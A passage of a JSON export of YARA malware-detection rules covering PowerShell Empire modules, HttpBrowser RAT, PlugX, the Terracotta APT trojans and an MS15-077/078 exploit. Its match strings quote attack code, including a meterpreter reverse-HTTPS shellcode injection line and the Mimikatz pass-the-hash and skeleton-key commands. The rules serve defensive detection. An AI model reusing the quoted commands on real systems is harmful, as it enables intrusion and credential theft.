message.py","minimum_yara":"1.7","name":"Empire_lib_modules_trollsploit_message_RID36CC","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"c67c8a7679e2a9f0eebc00d6c9655201","score":70,"tags":["SUSP","DEMO","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule Empire_Persistence_RID2E57 : DEMO SCRIPT SUSP T1086 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Persistence.psm1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 11:10:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -V\" ascii\n      $s2 = \"# Execute the following to remove the user-level persistent payload\" fullword ascii\n      $s3 = \"$PersistantScript = $PersistantScript.ToString().Replace('EXECUTEFUNCTION', \\\"$PersistenceScriptName -Persist\\\")\" fullword ascii\n   condition: \n      filesize < 108KB and 1 of them\n}","date":"2015-08-06 11:10:21","description":"Empire - a pure PowerShell post-exploitation agent - file Persistence.psm1","minimum_yara":"1.7","name":"Empire_Persistence_RID2E57","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"acca598ff463e33990aa88ea85273d16","score":70,"tags":["SUSP","DEMO","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule Empire_portscan_RID2D3C : DEMO SCRIPT SUSP T1086 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file portscan.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 10:23:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"script += \\\"Invoke-PortScan -noProgressMeter -f\\\"\" fullword ascii\n      $s2 = \"script += \\\" | ? {$_.alive}| Select-Object HostName,@{name='OpenPorts';expression={$_.openPorts -join ','}} | ft -wrap | Out-Str\" ascii\n   condition: \n      filesize < 14KB and all of them\n}","date":"2015-08-06 10:23:11","description":"Empire - a pure PowerShell post-exploitation agent - file portscan.py","minimum_yara":"1.7","name":"Empire_portscan_RID2D3C","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"18a34460b5845afbdce198aed2fc0c73","score":70,"tags":["SUSP","DEMO","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule Empire_Invoke_Shellcode_RID3030 : DEMO SCRIPT SUSP T1086 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 12:29:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos\" ascii\n      $s2 = \"\\\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\\\" ) )\" fullword ascii\n      $s3 = \"$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)\" fullword ascii\n   condition: \n      filesize < 100KB and 1 of them\n}","date":"2015-08-06 12:29:11","description":"Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1","minimum_yara":"1.7","name":"Empire_Invoke_Shellcode_RID3030","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"a178ed59a274ef7e78c009befbd1c8ba","score":70,"tags":["SUSP","DEMO","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule Empire_Invoke_Mimikatz_1_RID3073 : DEMO SCRIPT SUSP T1003 T1075 T1086 T1097 T1178 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Invoke-Mimikatz.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 12:40:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1003, T1075, T1086, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$PEBytes64 = \\\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwc\" ascii\n      $s2 = \"[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)\" fullword ascii\n      $s3 = \"Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp\" fullword ascii\n   condition: \n      filesize < 2500KB and 2 of them\n}","date":"2015-08-06 12:40:21","description":"Empire - a pure PowerShell post-exploitation agent - file Invoke-Mimikatz.ps1","minimum_yara":"1.7","name":"Empire_Invoke_Mimikatz_1_RID3073","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"b0c42663a2a80661439d90c51a62f223","score":70,"tags":["T1178","SUSP","SCRIPT","T1097","T1075","DEMO","T1086","T1003"]},{"author":"Florian Roth","content":"rule Empire_lib_modules_credentials_mimikatz_pth_RID38BE : DEMO SCRIPT SUSP T1003 T1075 T1086 T1097 T1178 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file pth.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 18:34:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1003, T1075, T1086, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]\" fullword ascii\n      $s1 = \"command = \\\"sekurlsa::pth /user:\\\"+self.options[\\\"user\\\"]['Value']\" fullword ascii\n   condition: \n      filesize < 12KB and all of them\n}","date":"2015-08-06 18:34:11","description":"Empire - a pure PowerShell post-exploitation agent - file pth.py","minimum_yara":"1.7","name":"Empire_lib_modules_credentials_mimikatz_pth_RID38BE","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"c5e17daffaf8721d2fd0460251b0eede","score":70,"tags":["T1178","SUSP","SCRIPT","T1097","T1075","DEMO","T1086","T1003"]},{"author":"Florian Roth","content":"rule Empire_Write_HijackDll_RID2FA2 : DEMO SCRIPT SUSP T1086 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Write-HijackDll.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 12:05:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString \\\"debug.bat\\\" -ReplaceString $BatchPath\" fullword ascii\n      $s2 = \"$DllBytes32 = \\\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBw\" ascii\n      $s3 = \"[Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)\" fullword ascii\n   condition: \n      filesize < 500KB and 2 of them\n}","date":"2015-08-06 12:05:31","description":"Empire - a pure PowerShell post-exploitation agent - file Write-HijackDll.ps1","minimum_yara":"1.7","name":"Empire_Write_HijackDll_RID2FA2","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"46af379772268b1fb3f062c07bb47773","score":70,"tags":["SUSP","DEMO","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule Empire_skeleton_key_RID2EDF : DEMO SCRIPT SUSP T1086 T1098 T1177 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file skeleton_key.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 11:33:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086, T1098, T1177\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"script += \\\"Invoke-Mimikatz -Command '\\\\\\\"\\\" + command + \\\"\\\\\\\"';\\\"\" fullword ascii\n      $s2 = \"script += '\\\"Skeleton key implanted. Use password \\\\'mimikatz\\\\' for access.\\\"'\" fullword ascii\n      $s3 = \"command = \\\"misc::skeleton\\\"\" fullword ascii\n      $s4 = \"\\\"ONLY APPLICABLE ON DOMAIN CONTROLLERS!\\\"),\" fullword ascii\n   condition: \n      filesize < 6KB and 2 of them\n}","date":"2015-08-06 11:33:01","description":"Empire - a pure PowerShell post-exploitation agent - file skeleton_key.py","minimum_yara":"1.7","name":"Empire_skeleton_key_RID2EDF","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"36fc680ade21f8fa5f57e972b31f9900","score":70,"tags":["SUSP","SCRIPT","DEMO","T1098","T1086","T1177"]},{"author":"Florian Roth","content":"rule Empire_invoke_wmi_RID2E0A : DEMO SCRIPT SUSP T1086 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file invoke_wmi.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 10:57:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]\" fullword ascii\n      $s2 = \"script += \\\";'Invoke-Wmi executed on \\\" +computerNames +\\\"'\\\"\" fullword ascii\n      $s3 = \"script = \\\"$PSPassword = \\\\\\\"\\\"+password+\\\"\\\\\\\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Man\" ascii\n   condition: \n      filesize < 20KB and 2 of them\n}","date":"2015-08-06 10:57:31","description":"Empire - a pure PowerShell post-exploitation agent - file invoke_wmi.py","minimum_yara":"1.7","name":"Empire_invoke_wmi_RID2E0A","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"fae411c5405ca0609834ac83cc74f497","score":70,"tags":["SUSP","DEMO","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule HttpBrowser_RAT_Sample1_RID2FCD : APT DEMO EXE FILE MAL T1038 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 12:12:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1038\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"update.hancominc.com\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $s0\n}","date":"2015-08-06 12:12:41","description":"Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com","minimum_yara":"1.7","name":"HttpBrowser_RAT_Sample1_RID2FCD","reference":"http://snip.ly/giNB","required_modules":[],"rule_hash":"8cedf5b8a1bf22758d20e2114be87708","score":80,"tags":["T1038","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule HttpBrowser_RAT_dropper_Gen1_RID31E0 : APT DEMO EXE FILE MAL T1038 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 13:41:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1038\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"1001=cmd.exe\" fullword ascii\n      $x2 = \"1003=ShellExecuteA\" fullword ascii\n      $x3 = \"1002=/c del /q %s\" fullword ascii\n      $x4 = \"1004=SetThreadPriority\" fullword ascii\n      $op0 = { e8 71 11 00 00 83 c4 10 ff 4d e4 8b f0 78 07 8b } \n      $op1 = { e8 85 34 00 00 59 59 8b 86 b4 } \n      $op2 = { 8b 45 0c 83 38 00 0f 84 97 } \n      $op3 = { 8b 45 0c 83 38 00 0f 84 98 } \n      $op4 = { 89 7e 0c ff 15 a0 50 40 00 59 8b d8 6a 20 59 8d } \n      $op5 = { 56 8d 85 cd fc ff ff 53 50 88 9d cc fc ff ff e8 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of ( $x* ) and 1 of ( $op* )\n}","date":"2015-08-06 13:41:11","description":"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper","minimum_yara":"1.7","name":"HttpBrowser_RAT_dropper_Gen1_RID31E0","reference":"http://snip.ly/giNB","required_modules":[],"rule_hash":"8b342ec50cc8e1ce7f6beeee253fc2e4","score":70,"tags":["T1038","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule HttpBrowser_RAT_Sample2_RID2FCE : APT DEMO EXE FILE MAL T1038 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Sample\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 12:12:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1038\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"nKERNEL32.DLL\" fullword wide\n      $s1 = \"WUSER32.DLL\" fullword wide\n      $s2 = \"mscoree.dll\" fullword wide\n      $s3 = \"VPDN_LU.exeUT\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}","date":"2015-08-06 12:12:51","description":"Threat Group 3390 APT Sample - HttpBrowser RAT Sample","minimum_yara":"1.7","name":"HttpBrowser_RAT_Sample2_RID2FCE","reference":"http://snip.ly/giNB","required_modules":[],"rule_hash":"ae192c0b376d8e405f53b48a8f492d4d","score":80,"tags":["T1038","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule HttpBrowser_RAT_Gen_RID2E54 : APT DEMO EXE FILE GEN MAL T1038 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Generic\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 11:09:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL, T1038\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%d|%s|%04d/%02d/%02d %02d:%02d:%02d|%ld|%d\" fullword wide\n      $s1 = \"HttpBrowser/1.0\" fullword wide\n      $s2 = \"set cmd : %s\" ascii fullword\n      $s3 = \"\\\\config.ini\" wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and filesize > 20KB and all of them\n}","date":"2015-08-06 11:09:51","description":"Threat Group 3390 APT Sample - HttpBrowser RAT Generic","minimum_yara":"1.7","name":"HttpBrowser_RAT_Gen_RID2E54","reference":"http://snip.ly/giNB","required_modules":[],"rule_hash":"0a8f2a2a0f107737986499287f983f53","score":90,"tags":["T1038","MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule PlugX_NvSmartMax_Gen_RID2ECA : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Threat Group 3390 APT Sample - PlugX NvSmartMax Generic\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 11:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"NvSmartMax.dll\" fullword ascii\n      $s1 = \"NvSmartMax.dll.url\" fullword ascii\n      $s2 = \"Nv.exe\" fullword ascii\n      $s4 = \"CryptProtectMemory failed\" fullword ascii\n      $s5 = \"CryptUnprotectMemory failed\" fullword ascii\n      $s7 = \"r%.*s(%d)%s\" fullword wide\n      $s8 = \" %s CRC \" fullword wide\n      $op0 = { c6 05 26 49 42 00 01 eb 4a 8d 85 00 f8 ff ff 50 } \n      $op1 = { 8d 85 c8 fe ff ff 50 8d 45 c8 50 c6 45 47 00 e8 } \n      $op2 = { e8 e6 65 00 00 50 68 10 43 41 00 e8 56 84 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of ( $s* ) and 1 of ( $op* )\n}","date":"2015-08-06 11:29:31","description":"Threat Group 3390 APT Sample - PlugX NvSmartMax Generic","minimum_yara":"1.7","name":"PlugX_NvSmartMax_Gen_RID2ECA","reference":"http://snip.ly/giNB","required_modules":[],"rule_hash":"df2d1bff9a74e9816e1036bbe0e3cca6","score":70,"tags":["APT","DEMO","EXE","GEN","FILE"]},{"author":"Florian Roth","content":"rule HttpBrowser_RAT_dropper_Gen2_RID31E1 : APT DEMO EXE FILE MAL T1038 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 13:41:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1038\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"navlu.dll.urlUT\" fullword ascii\n      $s2 = \"VPDN_LU.exeUT\" fullword ascii\n      $s3 = \"pnipcn.dllUT\" fullword ascii\n      $s4 = \"\\\\ssonsvr.exe\" fullword ascii\n      $s5 = \"/c del /q %s\" fullword ascii\n      $s6 = \"\\\\setup.exe\" fullword ascii\n      $s7 = \"msi.dllUT\" fullword ascii\n      $op0 = { 8b 45 0c 83 38 00 0f 84 98 } \n      $op1 = { e8 dd 07 00 00 ff 35 d8 fb 40 00 8b 35 7c a0 40 } \n      $op2 = { 83 fb 08 75 2c 8b 0d f8 af 40 00 89 4d dc 8b 0d } \n      $op3 = { c7 43 18 8c 69 40 00 e9 da 01 00 00 83 7d f0 00 } \n      $op4 = { 6a 01 e9 7c f8 ff ff bf 1a 40 00 96 1b 40 00 01 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of ( $s* ) and 1 of ( $op* )\n}","date":"2015-08-06 13:41:21","description":"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper","minimum_yara":"1.7","name":"HttpBrowser_RAT_dropper_Gen2_RID31E1","reference":"http://snip.ly/giNB","required_modules":[],"rule_hash":"b2d8dbeb89cd64c2e9c6cab362655918","score":70,"tags":["T1038","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule Apolmy_Privesc_Trojan_RID2F8B : APT DEMO EXE FILE MAL T1068 {\n   meta:\n      description = \"Apolmy Privilege Escalation Trojan used in APT Terracotta\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 12:01:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%d] Failed, %08X\" fullword ascii\n      $s2 = \"[%d] Offset can not fetched.\" fullword ascii\n      $s3 = \"PowerShadow2011\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-08-04 12:01:41","description":"Apolmy Privilege Escalation Trojan used in APT Terracotta","minimum_yara":"1.7","name":"Apolmy_Privesc_Trojan_RID2F8B","reference":"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/","required_modules":[],"rule_hash":"6b74ccbc60c1398e63ef6a08a5e74924","score":80,"tags":["T1068","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule Mithozhan_Trojan_RID2D90 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Mitozhan Trojan used in APT Terracotta\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 10:37:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"adbrowser\" fullword wide\n      $s2 = \"IJKLlGdmaWhram0vn36BgIOChYR3L45xcHNydXQvhmloa2ptbH8voYCDTw==\" fullword ascii\n      $s3 = \"EFGHlGdmaWhrL41sf36BgIOCL6R3dk8=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-08-04 10:37:11","description":"Mitozhan Trojan used in APT Terracotta","minimum_yara":"1.7","name":"Mithozhan_Trojan_RID2D90","reference":"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/","required_modules":[],"rule_hash":"a95ab8a8d33cb65a1e2d95eb0d085c61","score":70,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule RemoteExec_Tool_RID2CFF : APT DEMO EXE FILE {\n   meta:\n      description = \"Remote Access Tool used in APT Terracotta\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 10:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cmd.exe /q /c \\\"%s\\\"\" fullword ascii\n      $s1 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n      $s2 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n      $s3 = \"\\\\\\\\.\\\\pipe\\\\TermHlp_communicaton\" fullword ascii\n      $s4 = \"TermHlp_stdout\" fullword ascii\n      $s5 = \"TermHlp_stdin\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 75KB and 4 of ( $s* )\n}","date":"2015-08-04 10:13:01","description":"Remote Access Tool used in APT Terracotta","minimum_yara":"1.7","name":"RemoteExec_Tool_RID2CFF","reference":"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/","required_modules":[],"rule_hash":"5bfde6a69f576f4479d1a5ef0a7f3bad","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule LiuDoor_Malware_1_RID2D87 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Liudoor Trojan used in Terracotta APT\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 10:35:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"svchostdllserver.dll\" fullword ascii\n      $s2 = \"SvcHostDLL: RegisterServiceCtrlHandler %S failed\" fullword ascii\n      $s3 = \"\\\\nbtstat.exe\" fullword ascii\n      $s4 = \"DataVersionEx\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them\n}","date":"2015-08-04 10:35:41","description":"Liudoor Trojan used in Terracotta APT","minimum_yara":"1.7","name":"LiuDoor_Malware_1_RID2D87","reference":"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/","required_modules":[],"rule_hash":"4b853827f50229be8d533e1e2bcbd2b4","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule LiuDoor_Malware_2_RID2D88 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Liudoor Trojan used in Terracotta APT\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 10:35:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"svchostdllserver.dll\" fullword ascii\n      $s1 = \"Lpykh~mzCCRv|mplpykCCHvq{phlCC\\\\jmmzqkIzmlvpqCC\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-08-04 10:35:51","description":"Liudoor Trojan used in Terracotta APT","minimum_yara":"1.7","name":"LiuDoor_Malware_2_RID2D88","reference":"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/","required_modules":[],"rule_hash":"8abecb543f4eb5fe0af9df843fdcf68e","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_MiniDionis_VBS_Dropped_RID30B4 : DEMO MAL SCRIPT {\n   meta:\n      description = \"Dropped File - 1.vbs\"\n      author = \"Florian Roth\"\n      reference = \"https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/\"\n      date = \"2015-07-21 12:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wscript.Sleep 5000\" ascii\n      $s2 = \"Set FSO = CreateObject(\\\"Scripting.FileSystemObject\\\")\" ascii\n      $s3 = \"Set WshShell = CreateObject(\\\"WScript.Shell\\\")\" ascii\n      $s4 = \"If(FSO.FileExists(\\\"\" ascii\n      $s5 = \"then FSO.DeleteFile(\\\".\\\\\" ascii\n   condition: \n      filesize < 1KB and all of them and $s1 in ( 0 .. 40 )\n}","date":"2015-07-21 12:51:11","description":"Dropped File - 1.vbs","minimum_yara":"1.7","name":"MAL_MiniDionis_VBS_Dropped_RID30B4","reference":"https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/","required_modules":[],"rule_hash":"5e62ce472990e8ce732a51c25ee364b1","score":75,"tags":["DEMO","SCRIPT","MAL"]},{"author":"Florian Roth","content":"rule Exploit_MS15_077_078_RID2D56 : DEMO EXE EXPLOIT FILE T1189 {\n   meta:\n      description = \"MS15-078 / MS15-077 exploit - generic signature\"\n      author = \"Florian Roth\"\n      reference = \"https://code.google.com/p/google-security-research/issues/detail?id=473&can=1&start=200\"\n      date = \"2015-07-21 10:27:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, T1189\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GDI32.DLL\" fullword ascii\n      $s2 = \"atmfd.dll\" fullword wide\n      $s3 = \"AddFontMemResourceEx\" fullword ascii\n      $s4 = \"NamedEscape\" fullword ascii\n      $s5 = \"CreateBitmap\" fullword ascii\n      $s6 = \"DeleteObject\" fullword ascii\n      $op0 = { 83 45 e8 01 eb 07 c7 45 e8 } \n      $op1 = { 8d 85 24 42 fb ff 89 04 24 e8 80 22 00 00 c7 45 } \n      $op2 = { eb 54 8b 15 6c 00 4c 00 8d 85 24 42 fb ff 89 44 } \n      $op3 = { 64 00 88 ff 84 03 70 03 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 5 of ( $s* ) or 3 of ( $op* )\n}","date":"2015-07-21 